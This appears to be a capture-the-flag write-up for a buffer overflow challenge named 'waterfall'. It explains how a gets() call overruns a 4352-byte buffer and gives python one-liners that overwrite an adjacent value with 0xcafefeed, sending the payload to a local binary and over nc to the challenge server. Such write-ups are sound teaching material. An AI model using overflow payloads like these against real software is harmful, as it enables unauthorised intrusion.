# Waterfall writeup

When you open the code for waterfall.c you see an image of a waterfall written using ASCII characters.

More importantly at the top you see SIZE '0x1100' and GOAL '0xcafefeed'.

The size '0x1100' can be figured out in terminal by using 'python2 -c "print(0x1100)" or by using mathematics or a calculator and it returns a value of 4352.

In int main() we see gets(waterfall) which takes the user input and fills in the waterfall buffer (with size '0x1100'). So the waterfall buffer can take 4352 characters max.

We must fill up the char buffer to the max and add 8 bytes for padding so that the overflowing characters will be compared with GOAL value (code == GOAL).

The GOAL '0xcafefeed' is a hex string. So when you pump it into the program, it is written in little-endian format, so every byte (2 hex values) is ordered by least significant byte starting from the lowest index with the rest of the data placed in order towards the largest address finishing wtith the most significant byte at the end. So '0xcafe12' is stored as '12 fe ca'.

The solution can be obtained by using 

**Locally**

python2 -c "print('a'*4360)+'\xed\xfe\xfe\xca'" | ./waterfall

python3 -c "__import__('sys').stdout.buffer.write(b'a'*4360+b'\xed\xfe\xfe\xca\n')" | ./waterfall

**Remotely**

python2 -c "print('a'*4360)+'\xed\xfe\xfe\xca'" | nc waterfall.chal.hackmac.xyz 1337

python3 -c "__import__('sys').stdout.buffer.write(b'a'*4360+b'\xed\xfe\xfe\xca\n')" | nc waterfall.chal.hackmac.xyz 1337




